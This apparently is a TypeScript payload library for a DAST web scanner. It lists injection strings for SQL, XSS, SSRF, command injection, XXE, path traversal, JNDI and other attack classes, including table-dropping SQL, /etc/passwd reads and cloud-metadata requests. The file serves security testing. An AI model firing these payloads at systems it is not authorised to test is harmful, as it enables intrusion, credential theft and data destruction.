/**
 * OWASP Top 10 + Extended Attack Payloads for DAST
 *
 * Comprehensive payload coverage:
 * - SQLi, XSS, SSRF, Path Traversal, Command Injection, XXE
 * - JWT, Prototype Pollution, SSTI, CRLF, Mass Assignment
 * - IDOR, Rate Limit, HTTP Smuggling
 */

import { DastAttackCategory } from './types';

export interface AttackPayload {
  category: DastAttackCategory;
  name: string;
  payloads: string[];
  vulnIndicators?: string[];
  sqlErrorPatterns?: string[];
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  /** For JSON body injection */
  injectAsJson?: boolean;
}

export const ATTACK_PAYLOADS: AttackPayload[] = [
  // === SQL Injection ===
  {
    category: 'sql-injection',
    name: 'SQL Injection - Classic',
    severity: 'critical',
    payloads: [
      "' OR '1'='1", "' OR 1=1--", "1' OR '1'='1", "'; DROP TABLE users--",
      "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL,NULL--", "admin'--",
      "' OR ''='", "1' AND SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    sqlErrorPatterns: [
      'sql syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'SQLite', 'syntax error',
      'unclosed quotation', 'quoted string not properly terminated', 'SQLITE_ERROR',
      'mysql_', 'warning.*pg_', 'valid mysql result',
    ],
  },

  // === XSS ===
  {
    category: 'xss',
    name: 'Cross-Site Scripting',
    severity: 'high',
    payloads: [
      '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
      '"><script>alert(1)</script>', "'-alert(1)-'", '<svg/onload=alert(1)>',
      'javascript:alert(1)', '{{constructor.constructor("alert(1)")()}}',
      '\u003cscript\u003ealert(1)\u003c/script\u003e', // Unicode escaped
    ],
  },

  // === SSRF ===
  {
    category: 'ssrf',
    name: 'Server-Side Request Forgery',
    severity: 'high',
    payloads: [
      'http://127.0.0.1', 'http://localhost', 'http://169.254.169.254/latest/meta-data/',
      'http://metadata.google.internal/', 'http://[::1]', 'file:///etc/passwd',
      'http://0.0.0.0', 'http://169.254.169.254/latest/user-data/',
    ],
    vulnIndicators: ['ami-id', 'instance-id', 'account-id', 'root'],
  },

  // === Path Traversal ===
  {
    category: 'path-traversal',
    name: 'Path Traversal',
    severity: 'high',
    payloads: [
      '../../../etc/passwd', '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc/passwd', '....\/....\/....\/etc/passwd',
    ],
    vulnIndicators: ['root:', '[boot loader]', 'nobody:'],
  },

  // === Command Injection ===
  {
    category: 'command-injection',
    name: 'Command Injection',
    severity: 'critical',
    payloads: [
      '; ls -la', '| cat /etc/passwd', '`id`', '$(whoami)',
      '; sleep 5', '| ping -c 5 127.0.0.1', '\n/bin/cat /etc/passwd',
      '& dir', '| whoami', '; curl http://169.254.169.254/',
    ],
    vulnIndicators: ['root:', 'uid=', 'gid=', '[boot loader]'],
  },

  // === XXE ===
  {
    category: 'xxe',
    name: 'XML External Entity',
    severity: 'high',
    payloads: [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ],
    vulnIndicators: ['root:', 'ami-id', '[boot loader]'],
  },

  // === JWT / Broken Auth ===
  {
    category: 'jwt',
    name: 'JWT Algorithm Confusion',
    severity: 'critical',
    payloads: [
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.',
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.x',
      'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.x',
    ],
    vulnIndicators: ['token', 'invalid', 'signature', 'malformed', 'expired'],
  },

  {
    category: 'broken-auth',
    name: 'Broken Authentication',
    severity: 'high',
    payloads: [
      'admin', 'administrator', 'root', 'test', 'guest', 'user', 'null',
      "' OR '1'='1' --", "' OR 1=1#", "admin'--", "' OR ''='",
    ],
    vulnIndicators: ['welcome', 'dashboard', 'logout', 'authenticated'],
  },

  // === Prototype Pollution ===
  {
    category: 'prototype-pollution',
    name: 'JavaScript Prototype Pollution',
    severity: 'high',
    payloads: [
      '{"__proto__":{"polluted":true}}',
      '{"constructor":{"prototype":{"polluted":true}}}',
      '{"__proto__":{"isAdmin":true}}',
      '{"__proto__":{"toString":"polluted"}}',
    ],
    injectAsJson: true,
    vulnIndicators: ['polluted', 'isAdmin', 'toString', 'constructor'],
  },

  // === SSTI ===
  {
    category: 'ssti',
    name: 'Server-Side Template Injection',
    severity: 'high',
    payloads: [
      '{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '*{7*7}', '{{constructor.constructor("return process")()}}',
      '{{config}}', '{{self.__class__.__mro__[2].__subclasses__()}}',
      "{{''.__class__.__mro__[2].__subclasses__()}}",
    ],
    vulnIndicators: ['49', '14', 'config', 'object', '__class__'],
  },

  // === CRLF Injection ===
  {
    category: 'crlf-injection',
    name: 'CRLF / Header Injection',
    severity: 'medium',
    payloads: [
      '%0d%0aSet-Cookie:evil=1', '\r\nSet-Cookie:evil=1', '%0aSet-Cookie:evil=1',
      '%0d%0aX-Injected:true', '\r\nX-Injected:true',
    ],
  },

  // === Mass Assignment ===
  {
    category: 'mass-assignment',
    name: 'Mass Assignment / Overprivilege',
    severity: 'high',
    payloads: [
      '{"role":"admin"}', '{"isAdmin":true}', '{"admin":1}',
      '{"verified":true}', '{"privileged":true}', '{"__proto__":{"role":"admin"}}',
    ],
    injectAsJson: true,
  },

  // === IDOR / Access Control ===
  {
    category: 'idor',
    name: 'Insecure Direct Object Reference',
    severity: 'high',
    payloads: [
      '1', '0', '-1', '2', '100', '999999', 'admin', '..',
      '../1', '../../admin', '1%00', '1;2',
    ],
  },

  // === HTTP Smuggling ===
  {
    category: 'http-smuggling',
    name: 'HTTP Request Smuggling',
    severity: 'high',
    payloads: [
      '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: x',
      '0\r\n\r\n', '0\n\n', '0\x0b\x0b',
    ],
  },

  // === GraphQL ===
  {
    category: 'graphql',
    name: 'GraphQL Injection',
    severity: 'high',
    payloads: [
      '{"query":"{ __schema { types { name } } }"}',
      '{"query":"{ __typename }"}',
      '{"query":"mutation { __schema { types { name } } }"}',
      '{"query":"{ user(id: 1) { id __proto__ } }"}',
    ],
    injectAsJson: true,
    vulnIndicators: ['__schema', '__typename', 'QueryRoot', 'Mutation'],
  },

  // === NoSQL ===
  {
    category: 'nosql-injection',
    name: 'NoSQL Injection',
    severity: 'high',
    payloads: [
      '{"$gt":""}', '{"$ne":null}', "' || 1==1//", "' || '1'=='1",
    ],
    injectAsJson: true,
    vulnIndicators: ['$gt', '$ne', 'mongo', 'undefined'],
  },

  // === LDAP ===
  {
    category: 'ldap-injection',
    name: 'LDAP Injection',
    severity: 'high',
    payloads: ['*', ')(|(uid=*))( ', 'admin)(|(password=*'],
    vulnIndicators: ['ldap', 'bind', 'filter', 'invalid syntax'],
  },

  // === Log/JNDI ===
  {
    category: 'log-injection',
    name: 'Log Injection / JNDI',
    severity: 'critical',
    payloads: ['${jndi:ldap://x}', '${env:X}', '%24%7Bjndi%3aldap%3a%2f%2fx%7D'],
    vulnIndicators: ['jndi', 'lookup', 'ldap', 'naming'],
  },
];

/** Get payloads by category */
export function getPayloadsForCategory(category: DastAttackCategory): AttackPayload[] {
  if (category === 'all') return ATTACK_PAYLOADS;
  return ATTACK_PAYLOADS.filter((p) => p.category === category);
}

/** Get payload count multiplier for brutal mode - more payloads per param */
export function getPayloadLimit(category: DastAttackCategory, brutalMode: boolean): number {
  const base = brutalMode ? 8 : 4;
  if (category === 'sql-injection' || category === 'command-injection') return brutalMode ? 12 : 5;
  return base;
}

/** Brutal mode: merge inferno payloads for SQLi/XSS */
export function getBrutalPayloads(category: DastAttackCategory, attack: AttackPayload): string[] {
  if (category !== 'sql-injection' && category !== 'xss') return attack.payloads;
  try {
    const { SQLI_INFERNO, XSS_INFERNO } = require('./inferno-payloads');
    if (category === 'sql-injection' && SQLI_INFERNO) {
      return [...attack.payloads, ...SQLI_INFERNO.slice(0, 8).map((p: { payload: string }) => p.payload)];
    }
    if (category === 'xss' && XSS_INFERNO) {
      return [...attack.payloads, ...XSS_INFERNO.slice(0, 6).map((p: { payload: string }) => p.payload)];
    }
  } catch { /* ignore */ }
  return attack.payloads;
}

/** Default attack categories for full scan */
export const DEFAULT_ATTACK_CATEGORIES: DastAttackCategory[] = [
  'sql-injection', 'xss', 'ssrf', 'path-traversal', 'command-injection',
  'xxe', 'broken-auth', 'jwt', 'prototype-pollution', 'ssti', 'idor', 'mass-assignment',
];

/** BRUTAL MODE: All categories + inferno payloads. No mercy. */
export const BRUTAL_ATTACK_CATEGORIES: DastAttackCategory[] = [
  ...DEFAULT_ATTACK_CATEGORIES,
  'nosql-injection', 'ldap-injection', 'log-injection', 'header-injection',
];
